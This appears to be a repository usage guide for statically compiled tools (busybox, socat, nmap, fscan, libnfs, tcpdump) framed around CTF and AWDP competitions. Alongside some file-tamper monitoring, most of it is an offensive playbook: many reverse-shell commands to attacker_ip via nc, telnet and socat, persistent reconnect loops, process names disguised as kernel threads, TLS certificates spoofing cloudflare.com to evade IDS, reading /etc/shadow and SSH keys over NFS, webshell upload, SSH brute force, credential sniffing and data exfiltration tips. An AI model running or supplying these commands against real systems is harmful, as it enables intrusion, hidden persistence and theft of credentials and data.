# Usage Guide

English | [简体中文](USAGE.zh-CN.md)

This document covers how to use every statically compiled tool in this repository, including CTF/AWDP scenarios and reverse shell techniques.

---

## Tool Reference and CTF Examples

---

### 1. busybox — Embedded Linux Swiss Army Knife

**Version**: 1.36.1
**Size**: 1.2 MB
**Applets**: 245+, including shell, file tools, network tools, and system tools.

```bash
# List all applets
./busybox --list

# Usage 1: call an applet directly
./busybox wget http://10.0.0.1/shell.sh -O /tmp/shell.sh

# Usage 2: create symlinks and use commands directly
ln -s busybox nc
./nc -lvp 9999
```

#### CTF Scenarios

**Scenario 1: The target has a restricted environment and lacks basic commands**

```bash
# After uploading busybox to the target, create symlinks
for cmd in $(./busybox --list); do
    ln -s /tmp/busybox /tmp/$cmd 2>/dev/null
done
export PATH=/tmp:$PATH

# You can now use wget, tar, gzip, nc, ps, top, and every other applet
wget http://attacker_server/payload.tar.gz
tar xzf payload.tar.gz
```

**Scenario 2: AWDP incident response — process triage**

```bash
./busybox ps aux                          # List all processes
./busybox netstat -tlnp                   # List listening ports
./busybox lsof -i                         # Show network connections
./busybox top -bn1                        # One-shot process resource usage
```

**Scenario 3: Use httpd to quickly serve files for download**

```bash
# Start an HTTP server under /tmp on the target for teammates/targets to download tools
./busybox httpd -f -p 8080 -h /tmp/
```

**Scenario 4: nc (netcat) reverse shell**

```bash
# === Run on the target (connect back to the attacker) ===
# Option A: -e flag (supported by some nc builds)
./busybox nc attacker_ip 9999 -e /bin/sh

# Option B: pipe method (more portable, no -e required)
./busybox nc attacker_ip 9999 -e /bin/sh
# If -e is unsupported, use a pipe:
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc attacker_ip 9999 > /tmp/f
```

**Scenario 5: telnet reverse shell**

```bash
# Attacker opens two listening ports (one for command output, one for command input)
# Attacker terminal 1: receive output
./busybox nc -lvp 8888
# Attacker terminal 2: send commands
./busybox nc -lvp 9999

# Run on the target
rm -f /tmp/f; mkfifo /tmp/f
./busybox telnet attacker_ip 8888 < /tmp/f | /bin/sh 2>&1 | ./busybox telnet attacker_ip 9999 > /tmp/f
```

---

### 2. inotifywait — File System Event Monitoring

**Version**: 4.23.9.0
**Size**: 170 KB

Monitors file system changes (create, modify, delete, move, etc.) and is the core tool for **file tamper detection** in AWDP.

```bash
# Basic syntax
./inotify-tools/inotifywait [options] <path>

# Monitor all modify events under /var/www/html
./inotify-tools/inotifywait -m -r -e modify /var/www/html

# Custom output format (time|event|path)
./inotify-tools/inotifywait -m -r --format '%T %e %w%f' --timefmt '%H:%M:%S' /var/www/html
```

#### CTF Scenarios

**Scenario 1: AWDP real-time monitoring of web directory tampering**

```bash
# Continuously monitor the web directory and alert immediately on modifications
./inotify-tools/inotifywait -m -r \
    -e modify,create,delete,move \
    --format '%T [%e] %w%f' --timefmt '%Y-%m-%d %H:%M:%S' \
    /var/www/html | tee /tmp/web_monitor.log &

# Once an anomaly is detected, perform incident response immediately
# You can combine this with --exec or post-process the piped output
```

**Scenario 2: Monitor whether sensitive configuration files are read**

```bash
# Monitor access to /etc/shadow and /etc/passwd
./inotify-tools/inotifywait -m \
    -e access,modify,open \
    /etc/shadow /etc/passwd &

# In AWDP this can reveal an opponent's privilege escalation or information gathering
```

**Scenario 3: Monitor /tmp for webshell drops**

```bash
# Monitor file creation in the temporary directory
./inotify-tools/inotifywait -m -r \
    -e create \
    --exclude '\.sock$' \
    /tmp | while read line; do
    echo "[ALERT] New file in /tmp: $line"
    # Automatic kill/cleanup logic
done
```

---

### 3. inotifywatch — File System Event Statistics

**Version**: 4.23.9.0
**Size**: 158 KB

Collects file event statistics over a period of time, useful for analyzing file system activity hotspots.

```bash
# Collect events under /var/www for 30 seconds
./inotify-tools/inotifywatch -r -t 30 /var/www
```

#### CTF Scenarios

**Scenario: Compare a pre-match AWDP baseline with in-match anomalies**

```bash
# Pre-match: collect a 5-minute baseline of event statistics
./inotify-tools/inotifywatch -r -t 300 /var/www/html > /tmp/baseline.log

# In-match: keep collecting statistics and compare with the baseline to spot anomalies
watch -n 60 './inotify-tools/inotifywatch -r -t 30 /var/www/html'
```

---

### 4. nfs-cat — Read NFS Files Directly

**Size**: 461 KB

Reads file contents from NFS shares without mounting them.

```bash
# Syntax
./libnfs/nfs-cat nfs://<server>/<path>

# Read /etc/passwd from an NFS server
./libnfs/nfs-cat nfs://192.168.1.100/etc/passwd
```

#### CTF Scenarios

**Scenario 1: Exploit unauthorized NFS access to read sensitive files**

```bash
# After discovering an NFS share, read files directly
./libnfs/nfs-cat nfs://10.0.0.5/etc/shadow            # Read password hashes
./libnfs/nfs-cat nfs://10.0.0.5/home/user/.ssh/id_rsa # Read an SSH private key
./libnfs/nfs-cat nfs://10.0.0.5/flag                  # CTF flag
```

**Scenario 2: Read web application source code from an NFS share**

```bash
# Read web application source from NFS and audit it for weaknesses
./libnfs/nfs-cat nfs://10.0.0.5/var/www/html/config.php
```

---

### 5. nfs-cp — Copy NFS Files

**Size**: 465 KB

Copies files between the local file system and NFS shares.

```bash
# Download from NFS to local
./libnfs/nfs-cp nfs://192.168.1.100/flag.txt /tmp/flag.txt

# Upload from local to NFS
./libnfs/nfs-cp /tmp/payload.sh nfs://192.168.1.100/tmp/payload.sh
```

#### CTF Scenarios

**Scenario 1: AWDP — upload a webshell to an opponent's NFS share**

```bash
# Abuse the opponent's unauthorized NFS access to upload a webshell
./libnfs/nfs-cp /tmp/shell.php nfs://10.0.0.50/var/www/html/shell.php
```

**Scenario 2: Steal flag files from NFS**

```bash
# Download flags from NFS
for ip in $(seq 1 254); do
    ./libnfs/nfs-cp nfs://10.0.0.$ip/flag /tmp/flags/flag_$ip 2>/dev/null &
done
```

---

### 6. nfs-ls — List NFS Directories

**Size**: 465 KB

Lists directory contents on NFS shares, with recursive and discovery modes.

```bash
# List the NFS share root
./libnfs/nfs-ls nfs://192.168.1.100/

# Recursively list all files
./libnfs/nfs-ls -R nfs://192.168.1.100/home/

# Discover NFS servers
./libnfs/nfs-ls -D nfs://192.168.1.100/
```

#### CTF Scenarios

**Scenario 1: Enumerate NFS share structure during a penetration test**

```bash
# Recursively list all files to quickly locate flags and sensitive files
./libnfs/nfs-ls -R nfs://10.0.0.10/ 2>/dev/null
```

**Scenario 2: Batch-detect NFS services on an internal network**

```bash
# Probe all NFS shares in a /24
for ip in $(seq 1 254); do
    result=$(./libnfs/nfs-ls nfs://10.0.0.$ip/ 2>&1)
    if [ $? -eq 0 ]; then
        echo "[FOUND] NFS at 10.0.0.$ip"
    fi
done
```

---

### 7. nfs-stat — Inspect NFS File Attributes

**Size**: 477 KB

Shows metadata for files/directories on NFS shares (permissions, size, timestamps, etc.).

```bash
./libnfs/nfs-stat nfs://192.168.1.100/etc/passwd
```

#### CTF Scenarios

```bash
# Inspect flag file attributes to determine whether it is readable
./libnfs/nfs-stat nfs://10.0.0.20/flag

# Check for writable directories
./libnfs/nfs-stat nfs://10.0.0.20/tmp/
```

---

### 8. fscan — Comprehensive Internal Network Scanner

**Version**: 2.1.3
**Language**: Go (statically linked, `CGO_ENABLED=0`)

An all-in-one tool for port scanning, service identification, vulnerability detection, weak-credential brute forcing, and exploitation.

```bash
# Basic scan
./net/fscan -h 192.168.1.1

# Specify a port range
./net/fscan -h 192.168.1.1/24 -p 22,80,3306,6379

# Vulnerability scanning mode
./net/fscan -h 192.168.1.1 -m poc
```

#### CTF Scenarios

**Scenario 1: Rapid information gathering at AWDP start**

```bash
# Scan the target subnet and output JSON for automated parsing
./net/fscan -h 10.0.0.0/24 \
    -p 21,22,80,443,3306,6379,8080 \
    -o /tmp/scan_result.json

# Quickly analyze the results
cat /tmp/scan_result.json | jq '.[] | {ip: .host, ports: .ports[] | .port}'
```

**Scenario 2: Automated weak-credential attacks at scale**

```bash
# Batch-connect to discovered hosts with weak SSH credentials
for ip in $(cat /tmp/ssh_targets.txt); do
    ./net/fscan -h $ip -m ssh -user root -pwd root &
done
```

**Scenario 3: Discover unauthorized Redis access**

```bash
# Redis unauthorized access scan + public key write
./net/fscan -h 10.0.0.0/24 -p 6379 -m redis
```

---

### 9. nmap — The Classic Network Scanner

**Version**: 7.992
**Features**: OpenSSL, Lua NSE scripting engine, IPv6

> The build output includes `net/nmap-data/`. When running nmap on a target machine, if it cannot find its data files, point it at them explicitly:
>
> ```bash
> export NMAPDIR=$PWD/net/nmap-data
> ```
>
> Or use `./net/nmap --datadir ./net/nmap-data ...`.

```bash
# SYN half-open scan
./net/nmap -sS 192.168.1.0/24

# Service version detection + OS fingerprinting
./net/nmap -sV -O 192.168.1.1

# NSE script scan
./net/nmap --script vuln 192.168.1.1

# Fast host discovery
./net/nmap -sn 192.168.1.0/24
```

#### CTF Scenarios

**Scenario 1: Internal host discovery + port scanning**

```bash
# Step 1: ICMP ping sweep for live hosts
./net/nmap -sn -oG /tmp/alive.txt 10.0.0.0/24

# Step 2: Detailed port scan of live hosts
grep "Up" /tmp/alive.txt | cut -d' ' -f2 > /tmp/ips.txt
./net/nmap -sS -sV -p- -iL /tmp/ips.txt -oA /tmp/full_scan
```

**Scenario 2: AWDP opponent service identification**

```bash
# Quickly identify an opponent's web technology stack
./net/nmap -sV --script=http-headers,http-enum,http-title \
    -p 80,443,8080,8000 10.0.0.0/24
```

**Scenario 3: Use NSE to probe for known vulnerabilities**

```bash
# Probe for common web vulnerabilities
./net/nmap --script=http-sql-injection,http-shellshock \
    -p 80 10.0.0.50
```

---

### 10. redsocks — Transparent TCP Proxy

**Version**: 0.5-11-g19b822e
**Size**: 365 KB

Uses iptables REDIRECT/TPROXY to transparently forward TCP traffic to a SOCKS/HTTP proxy.

#### CTF Scenarios

**Scenario: Build a covert communication tunnel through a jump host**

```bash
# Create a redsocks configuration file, redsocks.conf
cat > /tmp/redsocks.conf << 'EOF'
base {
    log_debug = on;
    log_info = on;
    log = "file:/tmp/redsocks.log";
    daemon = on;
    redirector = iptables;
}
redsocks {
    local_ip = 127.0.0.1;
    local_port = 12345;
    ip = 10.0.0.100;    # SOCKS proxy server
    port = 1080;
    type = socks5;
}
EOF

# Start redsocks
./net/redsocks -c /tmp/redsocks.conf

# Configure iptables rules (requires root)
iptables -t nat -A OUTPUT -p tcp -d 0/0 -j REDIRECT --to-ports 12345
```

**Scenario 2: Bypass a firewall for outbound traffic**

```bash
# Forward all local outbound traffic through a SOCKS5 tunnel
# Reach internal resources through the firewall
./net/redsocks -c /tmp/redsocks.conf
```

---

### 11. socat — Networking Swiss Army Knife

**Version**: 1.8.0.1
**Size**: 6.5 MB
**Features**: OpenSSL/TLS, readline, TUN/TAP, SOCKS, HTTP proxy, PTY, EXEC

Supports 100+ address types and is the most flexible networking tool in CTF.

```bash
# TCP port forwarding
./net/socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.100:80

# Encrypted bind/reverse shell (OpenSSL)
# Server
./net/socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash
# Client
./net/socat OPENSSL:server_ip:443,verify=0 EXEC:/bin/bash

# Reverse shell (plaintext)
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### CTF Scenarios

**Scenario 1: Basic reverse shell (plaintext TCP)**

```bash
# Attacker listener
./net/socat TCP-LISTEN:9999,reuseaddr STDOUT,raw,echo=0

# Target connects back (no pseudo-terminal, basic version)
./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh

# Target connects back (with PTY, supports Ctrl+C, vim, and full interaction)
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Scenario 2: SSL/TLS encrypted reverse shell — bypass IDS/IPS**

```bash
# Attacker generates a self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=cdn.example.com"

# Attacker listener (encrypted)
./net/socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork \
    STDOUT,raw,echo=0

# Target connects back (encrypted; traffic looks like HTTPS to IDS and is hard to detect)
./net/socat OPENSSL:attacker_ip:443,verify=0 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Scenario 3: Port reuse to pivot into an internal network**

```bash
# On the target (jump host), forward local port 3389 to an internal Windows machine
./net/socat TCP-LISTEN:3389,fork,reuseaddr TCP:192.168.1.50:3389 &

# Or forward into a multi-layer internal network
./net/socat TCP-LISTEN:2222,fork,reuseaddr \
    SOCKS4:10.0.0.100:192.168.2.50:22,socksport=1080
```

**Scenario 4: AWDP — bypass port blocking**

```bash
# Opponent blocked port 80? Map it with socat.
# Listen on 8080 in user space on the target and forward to local port 80
./net/socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80 &
```

**Scenario 5: Build a TUN tunnel**

```bash
# Build a virtual network interface tunnel between two machines
# Server
./net/socat TCP-LISTEN:7777 TUN:192.168.99.1/24,up
# Client
./net/socat TCP:server:7777 TUN:192.168.99.2/24,up
```

**Scenario 6: Quick file transfer**

```bash
# Sender
./net/socat -u FILE:payload.tar.gz TCP-LISTEN:8888,reuseaddr

# Receiver
./net/socat -u TCP:send_ip:8888 CREATE:/tmp/payload.tar.gz
```

**Scenario 7: Reverse shell variants in detail**

socat is the most powerful reverse shell tool in CTF. The variants are explained below.

**① Basic reverse shell (plaintext TCP)**

```bash
# Run on the target
./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh
```

**② Fully interactive PTY reverse shell**

> **Key parameters**: `pty` allocates a pseudo-terminal (supports Ctrl+C, Ctrl+Z, etc.); `stderr` redirects stderr to the socket; `setsid` creates a new session detached from the current terminal; `sigint` passes SIGINT to the child process; `sane` puts the terminal into canonical line mode.

```bash
# Run on the target (wait for a connection)
./net/socat TCP-LISTEN:9999,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Or connect back actively
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker listener (gives a stable interactive terminal)
./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999
```

**③ SSL/TLS encrypted reverse shell**

```bash
# Attacker: generate a certificate and listen
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj "/CN=cdn.example.com"
./net/socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT,raw,echo=0

# Target connects back (encrypted traffic; IDS sees HTTPS)
./net/socat OPENSSL:attacker_ip:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**④ Fork-mode persistent reverse shell (automatically reconnects after a drop)**

```bash
# Attacker fork mode (accept multiple connections simultaneously)
./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT,raw,echo=0

# Target reconnects forever (recovers automatically after a disconnect)
while true; do
    ./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    sleep 5
done &
```

**⑤ Reverse shell through a SOCKS proxy (multi-layer network pivoting)**

```bash
# Scenario: attacker 10.0.0.1, jump host 10.0.0.5 (SOCKS5:1080), target 172.16.0.100
# The attacker first establishes a SOCKS tunnel to the jump host, then the target connects back through SOCKS

# Target connects back through the jump host's SOCKS proxy
./net/socat SOCKS4:10.0.0.5:attacker_ip:9999,socksport=1080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**⑥ Reverse shell through an HTTP proxy**

```bash
# Target connects back through an HTTP CONNECT proxy
./net/socat PROXY:proxy_ip:attacker_ip:9999,proxyport=8080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**⑦ UDP reverse shell (bypass firewalls that only block TCP)**

```bash
# Attacker UDP listener
./net/socat UDP-LISTEN:9999 STDOUT

# Target UDP reverse shell
./net/socat UDP:attacker_ip:9999 EXEC:/bin/sh
```

**⑧ SCTP reverse shell**

```bash
# Attacker SCTP listener
./net/socat SCTP-LISTEN:9999 STDOUT

# Target SCTP reverse shell
./net/socat SCTP:attacker_ip:9999 EXEC:/bin/sh
```

**⑨ Process hiding techniques**

```bash
# Rename the process to a system process to evade ps-based triage
exec -a "[kworker/u:1]" ./net/socat TCP:attacker:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
```

---

### 12. tcpdump — Network Packet Analysis

**Version**: 4.99.4
**Size**: 1.9 MB
**Features**: BPF filters, pcap read/write, file rotation

```bash
# Capture all HTTP traffic
./net/tcpdump -i eth0 tcp port 80 -w http.pcap

# Watch DNS queries in real time
./net/tcpdump -i eth0 udp port 53 -n -v

# Capture traffic for a specific host
./net/tcpdump -i eth0 host 192.168.1.100 -w target.pcap

# Read and analyze from a pcap
./net/tcpdump -r capture.pcap -A
```

#### CTF Scenarios

**Scenario 1: AWDP — capture attack traffic for attribution**

```bash
# Start capturing and continuously record all traffic
./net/tcpdump -i eth0 -n -s 0 -W 100 -C 50 -w /tmp/traffic.pcap &

# After an anomaly is detected, analyze the attacker IP and techniques
./net/tcpdump -r /tmp/traffic.pcap -n host 10.0.0.66 | head -100
```

**Scenario 2: Capture plaintext passwords from teammates/opponents**

```bash
# Capture login credentials in HTTP POST requests
./net/tcpdump -i eth0 -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# Capture FTP passwords
./net/tcpdump -i eth0 -A 'tcp port 21'
```

**Scenario 3: Analyze whether ARP spoofing is present**

```bash
# Detect ARP attacks
./net/tcpdump -i eth0 -n arp | grep "arp reply" | while read line; do
    echo "[WARN] ARP reply: $line"
done
```

**Scenario 4: Extract files from HTTP traffic**

```bash
# Capture HTTP traffic to a file
./net/tcpdump -i eth0 tcp port 80 -w /tmp/http.pcap

# Use strings to quickly extract readable content
./busybox strings /tmp/http.pcap | grep -iE 'password|flag|secret|token'
```

---

## Reverse Shell Guide — Complete Reference

> This section summarizes **every tool in this repository that can be used for a reverse shell**, organized by scenario, with applicable conditions and key notes.

### Tool Comparison Cheat Sheet

| Tool | Encryption | PTY | Auto-reconnect | Size | Best for |
|------|:----------:|:---:|:--------------:|------|----------|
| `busybox nc` | ❌ | ❌ | ❌ | 1.2M | Lightweight, most portable, pipe method works without `-e` |
| `socat` (TCP) | ❌ | ✅ | ✅ | 6.5M | **First choice**, fully interactive terminal |
| `socat` (SSL) | ✅ | ✅ | ✅ | 6.5M | Encrypted traffic, IDS bypass |
| `socat` (SOCKS) | ❌ | ✅ | ✅ | 6.5M | Multi-layer internal pivoting |
| `socat` (UDP) | ❌ | ❌ | ❌ | 6.5M | Bypass TCP-only firewalls |
| `busybox telnet` | ❌ | ❌ | ❌ | 1.2M | Fallback when nc is unavailable |

---

### 1. busybox nc Reverse Shell

> **Note**: `-e` is not supported by every nc build; the FIFO pipe method is the most portable. The downside is no PTY, so interactive programs such as vim and su will not work.

```bash
# === Option A: -e flag (simple, but may be unsupported) ===
./busybox nc attacker_ip 9999 -e /bin/sh

# === Option B: FIFO pipe (most portable, recommended) ===
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc attacker_ip 9999 > /tmp/f

# === Option C: mkfifo + redirection (reusable connection) ===
rm -f /tmp/f; mkfifo /tmp/f
while true; do
    cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc -lkp 9999 > /tmp/f
done &
# Attacker: nc target_ip 9999
```

> **Key notes**: `-i` puts the shell into interactive mode, `2>&1` also sends stderr to the attacker, and `mkfifo` creates a named pipe that connects the stdin/stdout data flow in both directions.

---

### 2. socat Reverse Shell (All Scenarios)

#### 2.1 Basic TCP Reverse Shell

> **Note**: The simplest option, with no encryption or masquerading. Suitable for direct internal connections.

```bash
# Target
./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh

# Attacker
./net/socat TCP-LISTEN:9999 STDOUT
```

#### 2.2 Fully Interactive PTY Reverse Shell

> **Parameter details**:
> - `pty`: allocates a pseudo-terminal so the target process believes it is running on a real terminal (enables Ctrl+C, Ctrl+Z, tab completion)
> - `stderr`: redirects the child process's stderr to the socket; otherwise error output is lost
> - `setsid`: creates a new session ID so the shell is detached from the current terminal (avoids SIGHUP when the terminal closes)
> - `sigint`: passes SIGINT from the attacker's Ctrl+C to the child process (not to socat itself)
> - `sane`: sets canonical line mode when entering the PTY, preventing terminal state corruption

```bash
# Target
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker (recommended)
stty raw -echo; ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999; stty sane
# Note: stty raw -echo disables local echo; raw mode passes characters through unmodified
```

#### 2.3 SSL/TLS Encrypted Reverse Shell (Recommended for Production)

> **Note**: Traffic appears as HTTPS to IDS/WAF, and with port 443 it is nearly undetectable. The certificate can be self-signed because `verify=0` disables verification.

```bash
# Attacker: generate a self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem \
    -days 30 -nodes -subj "/CN=cloudflare.com"

# Attacker: listen
./net/socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,verify=0,fork \
    STDOUT,raw,echo=0

# Target: connect back
./net/socat OPENSSL:attacker_ip:443,verify=0 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### 2.4 Fork Mode — Multiple Concurrent Clients + Auto-reconnect

> **Note**: `fork` lets the attacker accept multiple connections at once (each with its own interactive window). The target uses a `while` loop to reconnect, avoiding loss of control due to network instability.

```bash
# Attacker: fork listener (accepts multiple connections)
./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT,raw,echo=0

# Target: reconnect forever (5-second interval)
while true; do
    ./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    sleep 5
done &
```

#### 2.5 Reverse Shell through a SOCKS Proxy (Multi-layer Pivoting)

> **Note**: When the target cannot reach the attacker directly, connect back through an existing SOCKS jump host. Useful for lateral movement across multiple internal networks.

```bash
# Assume jump host 10.0.0.5 already runs a SOCKS5 proxy (port 1080)
# The target connects to the attacker through the jump host's SOCKS5 proxy
./net/socat SOCKS4:10.0.0.5:attacker_ip:9999,socksport=1080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### 2.6 Reverse Shell through an HTTP Proxy

> **Note**: When the target network allows outbound HTTP/HTTPS but blocks other traffic, establish a tunnel with the HTTP CONNECT method.

```bash
./net/socat PROXY:proxy_ip:attacker_ip:9999,proxyport=8080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### 2.7 UDP Reverse Shell (Bypass TCP Traffic Auditing)

> **Note**: Some firewalls/WAFs only audit TCP traffic, so a UDP reverse shell can bypass them. Downsides: connectionless, no delivery guarantee, and no PTY support.

```bash
# Attacker
./net/socat UDP-LISTEN:9999 STDOUT

# Target
./net/socat UDP:attacker_ip:9999 EXEC:/bin/sh
```

#### 2.8 Variant: Bind Shell (Target Listens, Attacker Connects)

> **Note**: A reverse shell has the target connect out to the attacker (traversing NAT/firewalls); a bind shell has the target open a port and the attacker connect in.

```bash
# Target: open a shell on local port 9999 and wait for a connection
./net/socat TCP-LISTEN:9999,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker: connect to the target
./net/socat TCP:target_ip:9999 STDOUT,raw,echo=0
```

#### 2.9 Process Hiding Techniques

> **Note**: In AWDP, opponents use `ps aux` to look for malicious processes. `exec -a` changes the process name to masquerade as a system process.

```bash
exec -a "[kworker/u:1]" ./net/socat TCP:attacker:9999 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &

exec -a "[rcu_gp]" ./net/socat TCP:attacker:9999 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &

exec -a "systemd-journald" ./net/socat TCP:attacker:9999 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
```

---

### 3. busybox telnet Reverse Shell

> **Note**: When the target has no nc but has telnet, use a two-port scheme to emulate a reverse shell (one port for commands, one for output).

```bash
# Attacker: open two terminals
# Terminal 1: receive command output
./busybox nc -lvp 8888
# Terminal 2: send keyboard input
./busybox nc -lvp 9999

# Run on the target
rm -f /tmp/f; mkfifo /tmp/f
./busybox telnet attacker_ip 8888 < /tmp/f | \
    /bin/sh 2>&1 | \
    ./busybox telnet attacker_ip 9999 > /tmp/f
```

---

### 4. Practical Selection Guide

```
                    ┌─ Does the target have socat? ──── Yes ──→ Use socat SSL/PTY reverse shell (best)
                    │
Got a shell? ─── Need encryption? ──── Yes ──→ socat OPENSSL (bypass IDS)
    │               │
    │               └── No ──→ Need full interactivity? ──── Yes ──→ socat PTY
    │                              │
    │                              └── No ──→ busybox nc FIFO (smallest)
    │
    └── Only busybox? ──── Yes ──→ busybox nc pipe method (most portable)
         │
         └── No nc but telnet? ──→ busybox telnet two-port scheme
```

### Attacker Listener Setup Guide

```bash
# ===== Recommended: use socat as the listener (most capable) =====
# Basic listener
./net/socat TCP-LISTEN:9999,reuseaddr STDOUT

# Fork mode (supports multiple connections; re-listens after each kill)
./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT

# Use rlwrap for readline history and line editing
rlwrap ./net/socat TCP-LISTEN:9999,reuseaddr STDOUT

# Full PTY listener (pair with a PTY reverse shell on the target)
stty raw -echo; ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999; stty sane

# SSL encrypted listener
./net/socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,verify=0,fork STDOUT

# ===== Alternative: use busybox nc as the listener =====
./busybox nc -lvp 9999

# ===== Advanced: forward a listener to a Metasploit handler with socat =====
# socat port forward → msf multi/handler
./net/socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:4444 &
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## Comprehensive CTF Scenarios

### AWDP Opening Workflow

```bash
# ============ 1. Environment preparation ============
# Upload all tools to the target
tar czf tools.tar.gz busybox inotify-tools/ libnfs/ net/
# scp tools.tar.gz user@target:/tmp/
# On the target
tar xzf /tmp/tools.tar.gz -C /tmp/
cd /tmp

# Create busybox symlinks
for cmd in $(./busybox --list); do
    ln -sf /tmp/busybox /tmp/$cmd 2>/dev/null
done
export PATH=/tmp:$PATH

# ============ 2. Information gathering ============
# Quickly scan the internal network for live hosts and open ports
./net/nmap -sS -sV -p 21,22,80,443,3306,6379,8080 10.0.0.0/24 -oA /tmp/scan

# ============ 3. File monitoring ============
# Start continuous file monitoring
./inotify-tools/inotifywait -m -r \
    -e modify,create,delete,move \
    --format '%T [%e] %w%f' --timefmt '%Y-%m-%d %H:%M:%S' \
    /var/www/html /etc /home 2>&1 | \
    tee /tmp/monitor.log &

# ============ 4. Traffic capture ============
# Capture all traffic
./net/tcpdump -i eth0 -n -s 0 -W 50 -C 100 -w /tmp/traffic.pcap &

# ============ 5. Establish persistent communication ============
# SSL encrypted reverse shell
./net/socat OPENSSL:your_server:443,verify=0 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &

# ============ 6. Attack opponents ============
# Exploit vulnerabilities found in scan results
# Redis unauthorized access
./net/fscan -h 10.0.0.x -p 6379 -m redis

# Or exploit manually
./net/socat TCP-LISTEN:6379,fork TCP:10.0.0.x:6379
```

### Typical Penetration Challenge Workflow

```bash
# ============ External foothold ============
# Scan the target comprehensively
./net/nmap -sS -sV -sC -O -p- target.com -oA /tmp/recon

# Run a POC scan with fscan
./net/fscan -h target.com -m poc -o /tmp/poc_result.json

# ============ After gaining a foothold ============
# Upload the toolkit and set up the environment

# 1) Discover NFS services and read files directly
./libnfs/nfs-ls -R nfs://10.0.0.100/ 2>/dev/null
./libnfs/nfs-cat nfs://10.0.0.100/flag

# 2) Build an internal network tunnel with socat
# Attacker listener
./net/socat TCP-LISTEN:1080,fork,reuseaddr TCP:target_ip:1080
# Jump host (compromised machine) forwarding
./net/socat TCP-LISTEN:1080,fork,reuseaddr SOCKS4:attacker:internal_target:22,socksport=1080

# 3) Internal lateral movement
./net/nmap -sS -sV -Pn 10.0.0.0/24 -oA /tmp/internal

# 4) Steal key information
./busybox find / -name "flag*" -o -name "*.conf" -o -name "*.key" 2>/dev/null
```

---

## Tips and Tricks

1. **Batch probing**: Use bash loops with NFS/network tools to scan a whole /24
2. **Chunked uploads**: fscan is relatively large; split it with `busybox split` before uploading, then reassemble
3. **Stealth**: socat + OpenSSL encrypted communication bypasses most IDS/IPS
4. **Process hiding**: In AWDP, rename tool processes to avoid opponent triage (e.g. `exec -a [kworker/u:1] ./socat ...`)
5. **Traffic masquerading**: socat SSL traffic looks like HTTPS and is hard to spot on common ports (443/8443)
6. **Data exfiltration**: Without curl/wget, transfer data with `socat` TCP CONNECT or `busybox wget`
7. **Fast rollback**: In AWDP, combine inotify-tools monitoring with busybox cp backups and restore immediately when tampering is detected
